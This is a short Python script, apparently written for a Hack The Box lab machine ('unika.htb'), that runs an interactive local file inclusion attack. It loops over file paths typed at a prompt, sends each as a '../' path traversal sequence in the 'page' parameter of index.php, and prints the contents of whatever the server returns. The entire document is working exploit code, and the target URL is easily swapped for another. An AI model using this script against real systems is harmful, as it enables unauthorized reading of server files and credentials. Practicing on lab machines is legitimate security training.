#!/usr/bin/python3

import requests
from colorama import Fore, Style
import signal
import sys

def ctrl_c_handler(signal, frame):
    print(Fore.RED + '\n[!]Saliendo del LFI....' + Style.RESET_ALL)
    sys.exit(0)

def lfi(path):
    try:
        url = f"http://unika.htb/index.php?page=../../../../..{path}"
        req = requests.get(url)
        if req.status_code == 200:
            print(Fore.GREEN + f"{req.text}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"{path} No existe el archivo." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"LFI Error: {e}" + Style.RESET_ALL)

def main():
    signal.signal(signal.SIGINT, ctrl_c_handler)
    while True:
        path = input(Fore.BLUE + "[+] file >> " + Style.RESET_ALL)
        lfi(path)

if __name__ == "__main__":
    main()

